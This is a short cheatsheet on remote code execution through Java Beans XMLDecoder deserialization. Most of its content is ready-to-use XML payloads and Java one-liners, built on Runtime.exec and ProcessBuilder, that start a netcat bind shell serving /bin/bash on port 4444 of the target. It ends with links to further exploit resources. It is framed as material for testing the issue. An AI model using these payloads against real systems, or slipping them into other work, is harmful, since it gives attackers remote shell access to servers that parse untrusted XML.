## Java Beans XMLDecoder Remote Code Execution cheatsheet

Having a functionality of file upload or other function that is parsing input xml-type data that will later flow through the **XMLDecoder** component of _Java Beans_, one could try to play around it's known deserialization issue. In order to test that issue there should be specially crafted XML-payload used that would invoke arbitrary Java interfaces and methods with supplied parameters.

### Payloads

When one would like to start a bind shell on the target machine, he could use the payload like the following one:
```
Runtime.getRuntime().exec(new java.lang.String[]{"/usr/bin/nc", "-l", "-p", "4444", "-e", "/bin/bash"});
```

In such case desired XML would look like the following one:

```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_102" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec">
      <array class="java.lang.String" length="6">
          <void index="0">
              <string>/usr/bin/nc</string>
          </void>
          <void index="1">
              <string>-l</string>
          </void>
          <void index="2">
              <string>-p</string>
          </void>
          <void index="3">
              <string>4444</string>
          </void>
          <void index="4">
              <string>-e</string>
          </void>
          <void index="5">
              <string>/bin/bash</string>
          </void>
      </array>
      </void>
 </object>
</java>
```

or by using `ProcessBuilder`:

```
new java.lang.ProcessBuilder(new java.lang.String[]{"/usr/bin/nc", "-l", "-p", "4444", "-e", "/bin/bash"}).start()
```

Then the payload would look like:

```
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_102" class="java.beans.XMLDecoder">
  <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="6">
      <void index="0">
        <string>/usr/bin/nc</string>
      </void>
      <void index="1">
         <string>-l</string>
      </void>
      <void index="2">
         <string>-p</string>
      </void>
      <void index="3">
         <string>4444</string>
      </void>
      <void index="4">
         <string>-e</string>
      </void>
      <void index="5">
         <string>/bin/bash</string>
      </void>
    </array>
    <void method="start" id="process">
    </void>
  </void>
</java>
```

For more payloads and guides how to leverage **XMLDecoder** deserialization vulnerability, one can refer to following good quality sources:
- http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html
- https://github.com/o2platform/DefCon_RESTing/tree/master/Demos/_O2_Scripts/XmlEncoder%20-%20Restlet/exploits
